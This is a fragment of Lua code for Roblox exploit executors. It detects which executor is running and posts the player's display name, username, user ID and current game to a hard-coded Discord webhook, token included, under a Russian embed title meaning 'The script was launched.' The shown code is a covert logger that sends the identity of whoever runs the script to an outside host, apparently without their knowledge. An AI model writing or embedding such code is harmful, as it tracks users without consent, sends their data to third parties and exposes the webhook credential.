...
local webhookcheck = (syn and not is_sirhurt_closure and not pebc_execute and "Synapse X")
  ...
  or (identifyexecutor():find("Solara") and "Solara")
  or (identifyexecutor():find("Swift") and "Swift")
  or (identifyexecutor():find("Argon") and "Argon")
  or ("Shitty Exploit")

local url = "https://discord.com/api/webhooks/1326165448261111828/9mGtGC_-vMtwro60KeCLqLTOe0XeXn3R178h8m2fE--ib-uC7zWb18YL80vRnO_9N698"
...
local data = {
    ...
    ["embeds"] = {
        {
            ["author"] = {
                ["name"] = "Скрипт был запусчен",
                ["url"] = "https://bypass.city",
            },
            ["description"] = "[Player Info](https://www.roblox.com/users/"..Userid..")__\n"
                .."**Display Name:** "..DName.."\n"
                .."**Username:** "..Name.."\n"
                .."**User Id:** "..Userid.."\n"
                ...
                .."[Game Info](https://www.roblox.com/games/"..game.PlaceId..")__\n"
                .."Game: "..GAMENAME.."\n"
